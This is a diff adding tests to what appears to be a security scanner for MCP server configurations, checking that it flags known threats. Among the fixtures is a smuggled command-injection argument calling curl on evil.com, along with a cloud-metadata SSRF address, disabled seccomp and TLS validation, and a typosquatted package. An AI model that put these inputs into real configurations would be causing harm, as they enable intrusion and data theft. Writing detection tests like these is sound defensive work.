@@ -251,6 +251,114 @@ describe('analyzeKnownThreats', () => {
     expect(findings.length).toBeGreaterThan(0)
     expect(findings.some((f) => f.description.includes('reverse shell') || f.description.includes('PyPI'))).toBe(true)
   })
+
+  it('detects WhatsApp MCP server exfiltration threat', () => {
+    const server: MCPServer = {
+      name: 'whatsapp-mcp',
+      command: 'node',
+      args: ['server.js'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('WhatsApp'))).toBe(true)
+  })
+
+  it('detects Supabase MCP SQL injection threat', () => {
+    const server: MCPServer = {
+      name: 'supabase-mcp',
+      command: 'node',
+      args: ['server.js'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('SQL injection') || f.description.includes('Supabase'))).toBe(true)
+  })
+
+  it('detects HTTP transport without TLS', () => {
+    const server: MCPServer = {
+      name: 'remote',
+      command: 'node',
+      args: ['server.js', 'http://example.com/mcp'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('HTTP') || f.description.includes('TLS'))).toBe(true)
+  })
+
+  it('detects ampersand command injection in args', () => {
+    const server: MCPServer = {
+      name: 'legit',
+      command: 'node',
+      args: ['server.js', '&& curl http://evil.com'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('command injection') || f.description.includes('Command Injection'))).toBe(true)
+  })
+
+  it('detects seccomp-disabled docker containers', () => {
+    const server: MCPServer = {
+      name: 'container',
+      command: 'docker',
+      args: ['run', '--security-opt=seccomp=unconfined', 'mcp-image'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('seccomp') || f.description.includes('AppArmor'))).toBe(true)
+  })
+
+  it('detects typosquatted npm MCP packages', () => {
+    const server: MCPServer = {
+      name: 'tools',
+      command: 'npx',
+      args: ['mcp-serverr-filesystem'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('typo') || f.description.includes('Typosquat'))).toBe(true)
+  })
+
+  it('detects cloud metadata SSRF in args', () => {
+    const server: MCPServer = {
+      name: 'cloud',
+      command: 'node',
+      args: ['server.js', '--url=169.254.169.254'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('metadata') || f.description.includes('SSRF'))).toBe(true)
+  })
+
+  it('detects disabled certificate validation in args', () => {
+    const server: MCPServer = {
+      name: 'insecure',
+      command: 'node',
+      args: ['server.js', 'NODE_TLS_REJECT_UNAUTHORIZED=0'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('TLS') || f.description.includes('certificate'))).toBe(true)
+  })
+
+  it('detects CVE-2025-68143 (git_init)', () => {
+    const server: MCPServer = {
+      name: 'git-server',
+      command: 'npx',
+      args: ['-y', '@modelcontextprotocol/server-git'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('CVE-2025-68143') || f.description.includes('git_init'))).toBe(true)
+  })
 })
 
 describe('getKnownThreatCount', () => {
@@ -258,8 +366,8 @@ describe('getKnownThreatCount', () => {
     expect(getKnownThreatCount()).toBeGreaterThan(0)
   })
 
-  it('returns at least 35 threats (current database size)', () => {
-    expect(getKnownThreatCount()).toBeGreaterThanOrEqual(35)
+  it('returns at least 50 threats (current database size)', () => {
+    expect(getKnownThreatCount()).toBeGreaterThanOrEqual(50)
   })
 
   it('returns a consistent count', () => {
